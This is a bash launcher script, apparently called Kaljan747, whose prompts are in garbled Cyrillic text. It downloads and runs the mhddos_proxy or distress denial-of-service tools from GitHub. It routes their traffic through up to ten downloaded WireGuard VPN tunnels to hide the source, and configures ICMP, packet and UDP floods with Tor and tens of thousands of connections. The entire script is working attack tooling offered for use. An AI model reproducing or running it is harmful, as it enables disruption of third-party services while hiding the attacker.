#!/bin/bash
set -e

print_header() {
    echo -e "\e[1;36m========================================"
    echo -e "üöÄ  –ó–∞–ø—É—Å–∫ Kaljan747"
    echo -e "========================================\e[0m"
}

print_stage() {
    echo -e "\e[1;34m$1\e[0m"
}

SETTINGS_FILE="$HOME/.kaljan747_settings"

ask_user_id() {
    read -p "–í–≤–µ–¥—ñ—Ç—å –≤–∞—à user-id (—Ç—ñ–ª—å–∫–∏ —Ü–∏—Ñ—Ä–∏): " USER_ID
}

ask_run_parameters() {
    echo "–í–∏–±–µ—Ä—ñ—Ç—å –º–æ–¥—É–ª—å:"
    echo "1) mhddos_proxy"
    echo "2) distress"
    read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2): " mod_choice
    SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

    echo "–†–µ–¥–∞–≥—É–≤–∞—Ç–∏ INI –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º?"
    echo "1) –¢–∞–∫"
    echo "2) –ù—ñ"
    read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2): " edit_choice
    EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "–¢–∞–∫" || echo "–ù—ñ" )

    echo "–í–∏–±–µ—Ä—ñ—Ç—å —Ä–µ–∂–∏–º –∑–∞–ø—É—Å–∫—É:"
    echo "1) screen —É —Ñ–æ–Ω—ñ"
    echo "2) screen –≤—ñ–¥–∫—Ä–∏—Ç–æ"
    echo "3) –±–µ–∑ screen"
    read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2/3): " run_choice
    case "$run_choice" in
        1) SELECTED_RUN_MODE="screen —É —Ñ–æ–Ω—ñ";;
        2) SELECTED_RUN_MODE="screen –≤—ñ–¥–∫—Ä–∏—Ç–æ";;
        3) SELECTED_RUN_MODE="–±–µ–∑ screen";;
    esac
}

# –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∞–±–æ –≤–≤–µ–¥–µ–Ω–Ω—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å
if [ -f "$SETTINGS_FILE" ]; then
    echo "1) –í–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Å—Ç–∞—Ä—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è"
    echo "2) –í–≤–µ—Å—Ç–∏ –Ω–æ–≤—ñ"
    read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2): " choice
    [ "$choice" = "1" ] && source "$SETTINGS_FILE" || { USER_ID=""; SELECTED_MODULE=""; EDIT_INI=""; SELECTED_RUN_MODE=""; }
fi

# USER-ID
if [ -z "$USER_ID" ]; then
    while true; do
        ask_user_id
        [[ -z "$USER_ID" ]] && echo "User-id –æ–±–æ–≤'—è–∑–∫–æ–≤–∏–π. –ó–∞–≤–µ—Ä—à–µ–Ω–Ω—è." && exit 1
        [[ "$USER_ID" =~ ^[0-9]+$ ]] && break || echo "USER-ID –º–∞—î –º—ñ—Å—Ç–∏—Ç–∏ —Ç—ñ–ª—å–∫–∏ —Ü–∏—Ñ—Ä–∏!"
    done
fi

# –Ü–Ω—à—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏
[ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ] && ask_run_parameters

print_header
echo -e "üì•  USER-ID: \e[1;32m$USER_ID\e[0m"
echo -e "üß©  –ú–æ–¥—É–ª—å: \e[1;36m$SELECTED_MODULE\e[0m"
echo -e "üõ†Ô∏è  –†–µ–∂–∏–º: \e[1;36m$SELECTED_RUN_MODE\e[0m"

# –ó–±–µ—Ä–µ–∂–µ–Ω–Ω—è
cat > "$SETTINGS_FILE" <<EOF
USER_ID="$USER_ID"
SELECTED_MODULE="$SELECTED_MODULE"
EDIT_INI="$EDIT_INI"
SELECTED_RUN_MODE="$SELECTED_RUN_MODE"
EOF

# sudo
[ "$(id -u)" -eq 0 ] && SUDO="" || SUDO="sudo"

# –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞–ª–µ–∂–Ω–æ—Å—Ç–µ–π
print_stage "üì¶  –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞–ª–µ–∂–Ω–æ—Å—Ç–µ–π..."

INSTALL_PKGS="curl wget git screen sed wireguard-tools iproute2 nano"
if command -v apt >/dev/null; then
    $SUDO apt update -y && $SUDO apt install -y $INSTALL_PKGS
elif command -v dnf >/dev/null; then
    $SUDO dnf install -y $INSTALL_PKGS
elif command -v yum >/dev/null; then
    $SUDO yum install -y $INSTALL_PKGS
elif command -v apk >/dev/null; then
    $SUDO apk add --no-cache $INSTALL_PKGS
elif command -v pacman >/dev/null; then
    $SUDO pacman -Sy --noconfirm $INSTALL_PKGS
elif command -v zypper >/dev/null; then
    $SUDO zypper install -y $INSTALL_PKGS
else
    echo "‚ùå –ù–µ–≤—ñ–¥–æ–º–∏–π –ø–∞–∫–µ—Ç–Ω–∏–π –º–µ–Ω–µ–¥–∂–µ—Ä"
    exit 1
fi

# –ü–∞–ø–∫–∏
MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
mkdir -p "$MODULE_DIR" "$WG_DIR"
touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"

# –í–∏–±—ñ—Ä –º–æ–¥—É–ª—è
case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        ;;
esac

[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
chmod +x "$MODULE"

# –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è WG-–∫–æ–Ω—Ñ—ñ–≥—ñ–≤
print_stage "üåç  –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è WG-–∫–æ–Ω—Ñ—ñ–≥—ñ–≤..."

WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"

CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=")[^"]+\.conf(?=")' | grep "/k7771/Kaljan747/blob/" | sed -E 's|^/k7771/Kaljan747/blob/k7771/wg/||')

if [ -z "$CONF_LIST" ]; then
    echo "‚ö†Ô∏è –ù–µ –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–ø–∏—Å–æ–∫ .conf –∑ GitHub. –ü–µ—Ä–µ–≤—ñ—Ä—è—é –ª–æ–∫–∞–ª—å–Ω—É –ø–∞–ø–∫—É..."
    CONF_LIST=$(find "$WG_DIR" -name "*.conf" -type f)
    if [ -z "$CONF_LIST" ]; then
        echo "‚ùå –ñ–æ–¥–Ω–æ–≥–æ .conf —Ñ–∞–π–ª—É –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ –Ω–∞–≤—ñ—Ç—å –ª–æ–∫–∞–ª—å–Ω–æ. –ó–∞–≤–µ—Ä—à–µ–Ω–Ω—è."
        exit 1
    else
        echo "‚úÖ –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –ª–æ–∫–∞–ª—å–Ω—ñ —Ñ–∞–π–ª–∏: $(basename -a $CONF_LIST | tr '\n' ' ')"
    fi
else
    for file in $CONF_LIST; do
        RAW_URL="$WG_RAW_BASE/$file"
        DEST="$WG_DIR/$(basename "$file")"
        if ! curl -fsSL "$RAW_URL" -o "$DEST"; then
            echo "‚ö†Ô∏è curl –Ω–µ —Å–ø—Ä–∞—Ü—é–≤–∞–≤ ‚Äî –ø—Ä–æ–±—É—é wget"
            wget -qO "$DEST" "$RAW_URL" || echo "‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è: $file"
        fi
    done
fi

$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

# –ó—É–ø–∏–Ω–∫–∞ WG
for iface in $(wg show interfaces 2>/dev/null); do
    $SUDO wg-quick down "$iface" || true
    $SUDO ip link delete "$iface" || true
done

# –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è WG
WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 10))
WG_IFACES=()
for conf in "${WG_FILES[@]}"; do
    IFACE_NAME=$(basename "$conf" .conf)
    if $SUDO wg-quick up "$conf" 2>/dev/null; then
        if wg show "$IFACE_NAME" &>/dev/null; then
            WG_IFACES+=("$IFACE_NAME")
            echo "‚úÖ –ü—ñ–¥–Ω—è—Ç–æ: $IFACE_NAME"
        else
            echo "‚ö†Ô∏è –ù–µ–∞–∫—Ç–∏–≤–Ω–∏–π —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å: $IFACE_NAME"
        fi
    else
        echo "‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è: $IFACE_NAME"
    fi
    sleep 1
done

[ ${#WG_IFACES[@]} -eq 0 ] && echo "‚ùå –ñ–æ–¥–µ–Ω WG –Ω–µ –ø—ñ–¥–Ω—è–≤—Å—è. –ó–∞–≤–µ—Ä—à–µ–Ω–Ω—è." && exit 1

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
echo -e "üì° –ê–∫—Ç–∏–≤–Ω—ñ VPN: \e[1;36m$VPN_LIST\e[0m"

# –û–Ω–æ–≤–ª–µ–Ω–Ω—è INI
echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"

# –†–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è INI
[ "$EDIT_INI" = "–¢–∞–∫" ] && nano "$CONFIG_FILE"

# –ó–∞–ø—É—Å–∫
case "$SELECTED_RUN_MODE" in
    "screen —É —Ñ–æ–Ω—ñ") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "screen –≤—ñ–¥–∫—Ä–∏—Ç–æ") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "–±–µ–∑ screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
esac

exit 0
